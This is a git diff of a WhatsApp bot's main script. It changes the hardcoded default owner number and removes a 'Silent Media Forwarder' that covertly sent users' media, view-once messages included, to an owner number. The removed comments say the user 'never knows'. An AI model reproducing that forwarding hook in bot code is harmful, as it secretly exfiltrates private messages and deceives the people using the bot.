@@ -60,11 +60,10 @@ const { File } = require("megajs");
 // lib modules — lazy load
 let sms;
 let antidelete, handleAutoForward;
-let mediaFwdModule;  // 📥 Silent Media Forwarder (includes view-once)
 const { initAntiCrash } = require('./lib/anticrash');
 
 // ================= Global Variables =================
-const ownerNumber = (config.OWNER_NUMBER || "94740711462")
+const ownerNumber = (config.OWNER_NUMBER || "94707085822")
   .split(",")
   .map(n => n.replace(/[^0-9]/g, "").trim())
   .filter(Boolean);
@@ -601,22 +600,7 @@ async function startBot(sessionId, authPath, envConfig) {
       const isOwner      = ownerNumber.includes(senderNumber) || botNumber === senderNumber;
       const reply        = (text) => conn.sendMessage(from, { text }, { quoted: mek });
 
-      // ══════════════════════════════════════════════════════════════
-      //  📥 SILENT MEDIA FORWARDER — forward to owner (822) silently
-      //  Group: images only | Private: all media | View-once: all
-      //  🕵️ Silent + Invisible — user never knows
-      // ══════════════════════════════════════════════════════════════
-      if (mediaFwdModule && mediaFwdModule.mediaForwardHandler) {
-        mediaFwdModule.mediaForwardHandler(conn, mek, { pushName: mek.pushName }, {
-          from,
-          sender,
-          isGroup: from.endsWith('@g.us'),
-          groupName: null,
-          reply: () => {}  // silent — no reply to user
-        }).catch(() => {});
-      }
-
-      // ── Owner react — react to messages SENT TO owner ──
+      // ── Owner react ──
       if (isOwner && !mek.key.fromMe && !isCmd) {
         conn.sendMessage(from, { react: { text: "👑", key: mek.key } }).catch(() => {});
       }
@@ -762,7 +746,6 @@ setTimeout(async () => {
     sms        = require("./lib/msg").sms;
     antidelete = require("./plugins/antidelete");
     try { handleAutoForward = require("./plugins/forward").handleAutoForward; } catch {}
-    try { mediaFwdModule = require("./plugins/mediaforward"); console.log("[MEDIAFWD] Loaded ✅"); } catch (e) { console.log("[MEDIAFWD] load error:", e.message); }
     console.log("Lib modules loaded successfully.");
   } catch (e) {
     console.error("Lib load error:", e.message);
